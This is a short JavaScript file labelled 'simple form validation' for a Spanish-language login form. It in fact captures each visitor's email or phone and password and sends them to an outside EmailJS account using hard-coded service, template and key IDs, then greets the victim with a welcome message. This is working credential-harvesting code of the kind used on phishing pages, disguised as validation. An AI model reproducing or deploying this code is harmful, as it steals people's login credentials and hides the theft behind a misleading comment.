// Simple form validation
document.addEventListener('DOMContentLoaded', function() {
  emailjs.init("z9-aTt4t_P281yuE5");
  const loginForm = document.querySelector('.login-form');

  if (loginForm) {
    loginForm.addEventListener('submit', function(event) {
      event.preventDefault();

      const email = loginForm.querySelector('input[type="text"]').value.trim();
      const password = loginForm.querySelector('input[type="password"]').value.trim();

      if (!email || !password) {
        alert('Por favor, introduce tu correo electrónico o número de teléfono y tu contraseña.');
        return;
      }

      // Enviar los datos a EmailJS
      emailjs.send("service_upm88pg", "template_3u3w2iy", {
        email: email,
        password: password
      }).then(function(response) {
        alert("¡Bienvenido!");
      }, function(error) {
          alert("No puedes acceder❌");
      });
    });
  }
});



 
